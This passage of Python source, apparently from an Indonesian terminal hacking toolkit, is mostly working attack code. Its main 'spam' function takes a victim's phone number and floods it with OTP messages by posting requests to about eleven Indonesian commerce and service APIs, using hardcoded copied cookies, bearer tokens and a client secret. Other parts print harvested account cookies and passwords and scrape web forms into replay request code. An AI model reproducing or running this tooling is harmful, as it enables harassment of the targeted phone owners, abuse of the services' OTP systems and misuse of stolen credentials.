            tree = Tree(" ",guide_style=f"{color_panel}")
            if folder=="OK":
                cookie = akun.split("|")[1]
                tree.add(f"\r{H2}{user}{P2} ")
                tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
            else:
                tree.add(f"\r{K2}{user}|{pw}{P2} ")
            prints(tree)
        prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
        exit()
        
    ###----------[ GANTI WARNA TEMA ]---------- ###
    def ganti_tema(self):
        prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
        ask = console.input(f" {H2}• {P2}pilih tema : ")
        if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
        elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
        elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
        elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
        elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
        elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
        elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
        elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
        elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
        elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
        open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
        prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=80,padding=(0,6),style=f"{color_panel}"))
        sys.exit()

            
    ###----------[ TAMPILKAN COOKIE ]---------- ###
    def tampil_cookie(self):
        cookie = open('.cok.txt','r').read()
        now = datetime.now()
        hari = now.day+int(30)
        if hari > 30:hari = hari-30
        bulan = now.month+1
        if bulan > 12:bulan = bulan-12
        tahun = now.year+1
        if tahun > 1:tahun = now.year
        data = date(year=tahun,month=bulan,day=hari)
        aktif = data.strftime("%d %B %Y")
        console.print(f" {H2}• {P2}aktif sampai : {aktif}")
        prints(Panel(f"{H2}{cookie}",width=80,style=f"{color_panel}"))
        sys.exit()
    
###----------[ BOT ]---------- ###
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')

def process_data1():
    sleep(0.10)
def spam():
    try:
        prints(Panel(f"""{H2}Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx""",width=80,padding=(0,6),style=f"{color_panel}"))
        nomor = console.input(f" {H2}• {P2}Masukan No +62 : ").replace("+62","")
        for _ in track(range(100), description=f' {H2}• {P2} Sedang Spam...'):process_data1()
        tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
        site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text # tokped
        search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1) # tokped
        
        sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}).text # send requests tokped
        
        kukis={'cookie':'ajs_anonymous_id=5a3e8670-63ce-4348-8dca-641748d7d767','cookie':'_ALGOLIA=anonymous-2b34b4e4-c817-499f-a0d4-5930ffbaf7ff','cookie':'_fbp=fb.1.1662046677088.183334261','cookie':'g_state={"i_p":1662053880779,"i_l":1}','cookie':'_hjSessionUser_1895264=eyJpZCI6IjBkNWYwMjNjLWNjMGEtNTVmNi1hYTNkLTgwZmJjYTU5N2RhNiIsImNyZWF0ZWQiOjE2NjIwNDY2NzY2NTgsImV4aXN0aW5nIjp0cnVlfQ==','cookie':'amp_7c6549=BuD_ETdrbio9LDUB2TB6V-...1gc3r9m4s.1gc3r9m4s.0.0.0','cookie':'_clck=1nxlj0s|1|f4l|0','cookie':'tml_t=ab85e71e-ddd0-4317-a14b-1e5a6c202a43','cookie':'amp_4b05bb=jrGWubrrFNjGvlqLBgVTH_...1glb1ck7f.1glb1ck7f.0.0.0','cookie':'__cf_bm=Ee0IbDXhZjy2AiRtIyyK7OhmiIN9OawLBwVyRHC3DLQ-1672186583-0-AdaNbL4+xeIXNO1UbfZ1feHhHZCjnQlkjgARFkyoFJQ117Za5erTm4q2gKEuogBEtNqcxWbNCX/EoBa9wp7auxY=','cookie':'_gcl_aw=GCL.1672186586.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gcl_au=1.1.2101568662.1672186586','cookie':'utm={"utm_source":"Google","utm_medium":"Search","utm_campaign":"EN_AlwaysOn_PureBrand_Exact_Brand_","utm_term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'ucif={"src":"Google","med":"Search","camp":"EN_AlwaysOn_PureBrand_Exact_Brand_","cont":"carsome","term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'_hjIncludedInSessionSample=0','cookie':'_hjSession_1895264=eyJpZCI6ImE0YTAzNmVkLTBiNzctNGYzOC1hNWZiLTUzODEyM2RlNjU0NCIsImNyZWF0ZWQiOjE2NzIxODY1ODkxMDcsImluU2FtcGxlIjpmYWxzZX0=','cookie':'_hjAbsoluteSessionInProgress=1','cookie':'moe_uuid=30b62d3f-6f5c-46a2-b324-79bb5fdde264','cookie':'_gid=GA1.2.1272855920.1672186591','cookie':'_gac_UA-70043720-4=1.1672186591.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gat_UA-70043720-4=1','cookie':'_ga=GA1.1.651678291.1662046676','cookie':'_ga_L3ZY5XJB08=GS1.1.1672186591.5.0.1672186592.59.0.0','cookie':'tml_s=3ba17acd-ecae-4716-b725-d4176b4c88a1',
    'cookie':'_uetsid=e3fb7eb0864411eda3df3b3860185a56','cookie':'_uetvid=0f040fa02a0c11ed8727e1811f9a3cb3'} # kukis carsome
        carsome=requests.post("https://www.carsome.id/website/login/sendSMS",headers={'Host':'www.carsome.id','content-length':'38','sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','x-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','country':'ID','x-amplitude-device-id':'jrGWubrrFNjGvlqLBgVTH_','sec-ch-ua-platform':'"Android"','origin':'https://www.carsome.id','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.carsome.id/jual-mobil-bekas?utm_source=Google&utm_medium=Search&utm_campaign=EN_AlwaysOn_PureBrand_Exact_Brand_&utm_term=Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_&utm_content=carsome&gclid=CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies=kukis,data=json.dumps({"username":nomor,"optType":1})).text
        bibit=requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":nomor,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text
        cook={"cookie":"_gcl_au=1.1.909457086.1662115605","cookie":"__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"__gtm_referrer=https%3A%2F%2Fwww.google.com%2F","cookie":"_gid=GA1.2.1927488580.1662115605","cookie":"_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_fbp=fb.1.1662115607118.1815022728","cookie":"_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0","cookie":"poptin_old_user=true","cookie":"poptin_user_id=0.42qy01qhmjj","cookie":"evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137","cookie":"evm_version=2.48.14","cookie":"utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D","cookie":"_ga=GA1.2.56596919.1662115604","cookie":"_gat_gtag_UA_127603098_1=1","cookie":"_gat_UA-127603098-1=1","cookie":"_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0","cookie":"rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D","cookie":"rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D","cookie":"_gat=1","cookie":"MgidSensorNVis=2","cookie":"MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7","cookie":"_gat_%5Bobject%20Object%5D=1","cookie":"afUserId=154dedac-a679-4204-8121-fbd290672de8-p","cookie":"AF_SYNC=1662115627689","cookie":"registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"+nomor+"%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
    "cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
        Arifa=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","content-length":"25","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor}),cookies=cook).text
        ruparupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
        js=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
        ken=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=js).text
        possing = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}})).text
        segar=requests.post("https://api-v2.segari.id//v1/otps/generate",headers={"Host":"api-v2.segari.id","content-length":"30","accept":"application/json, text/plain, */*","x-segari-platform":"web","origin":"https://segari.id","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","referer":"https://segari.id/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":nomor})).text
        al=requests.get("https://www.toyskingdom.co.id/membership/send-otp?cellphone="+nomor+"&otp_type=register&email=tololbet615%40gmail.com",headers={'Host':'www.toyskingdom.co.id','Connection':'keep-alive','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','Accept':'*/*','X-Requested-With':'XMLHttpRequest','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://www.toyskingdom.co.id/membership/register/+aqXlp409RHHXTQyyGCurg==/zb3+iKnqYXQ86its61Z4Jg==','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}).text
        ses=requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers={'Host':'api.pintarnya.com','content-length':'27','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile':'?1','authorization':'Bearer undefined','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','platform':'web-kerja','sec-ch-ua-platform':'"Android"','origin':'https://pintarnya.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pintarnya.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"mobile":"+62"+nomor})).text
        pos=requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",headers={'Host':'api.duniagames.co.id','content-length':'58','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','accept-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','ciam-type':'FR','accept':'application/json, text/plain, */*','x-device':'c44cbb7b-b080-4cd3-8526-a90c0b5d3a98','sec-ch-ua-platform':'"Android"','origin':'https://duniagames.co.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://duniagames.co.id/','accept-encoding':'gzip, deflate, br'},data=json.dumps({"phoneNumber":"+62"+nomor,"userName":"0"+nomor})).text
        cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=80,padding=(0,2),style=f"bold white"))
    except KeyboardInterrupt:
        sys.exit(f"  [!] Program Dihentikan")


###----------[ MENU BOT ]---------- ###
class botdata:
    def menu(self):
        prints(Panel(f"""{P2}[{color_text}01{P2}]. Get Data Web [{color_text}02{P2}]. Spam SMS [{color_text}03{P2}]. Kembali Ke menu""",width=80,padding=(0,7),style=f"{color_panel}"))
        menu = console.input(f" {H2}• {P2}pilih menu : ")
        if menu in["01","1"]:
            get_data_web().__init__()
        elif menu in["02","2"]:
            spam()
        elif menu in["03","3"]:
            back()
        else:
            exit(prints(Panel(f"""{M2}🙏 Masukan Yang Bener Tolol""",width=80,style=f"{color_panel}")))

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        prints(Panel(f"""{H2}masukan url/link yang mau di source code""",width=80,padding=(0,6),style=f"{color_panel}"))
        url = console.input(f" {H2}• {P2}Masukan URL : ")
        prints(Panel(f"""{P2}[{color_text}01{P2}].Source Payload	[{color_text}02{P2}].Parsed Payload	\n[{color_text}03{P2}].Source Code Post Requests""",width=80,padding=(0,7),style=f"{color_panel}"))
        self.tanya = console.input(f" {H2}• {P2}pilih menu : ")
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit(f'{H2}• {P2} Isi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(Panel(f"""{P2}			[Source Payload]{P2}""",width=80,style=f"{color_panel}")) 
        prints(Panel(f"""{P2}[HOST]{H2}  %s"""%(self.domain),width=80,style=f"{color_panel}")) 
        prints(Panel(f"""{P2}[Head]{H2}  %s"""%(head),width=80,style=f"{color_panel}"))
        prints(Panel(f"""{P2}[Data]{H2}  %s"""%(data),width=80,style=f"{color_panel}"))
        prints(Panel(f"""{P2}[Coki]{H2}  %s"""%(coki),width=80,style=f"{color_panel}"))
        prints(Panel(f"""{P2}[Post]{H2}  %s"""%(post),width=80,style=f"{color_panel}"))
            
    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
        [
            "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
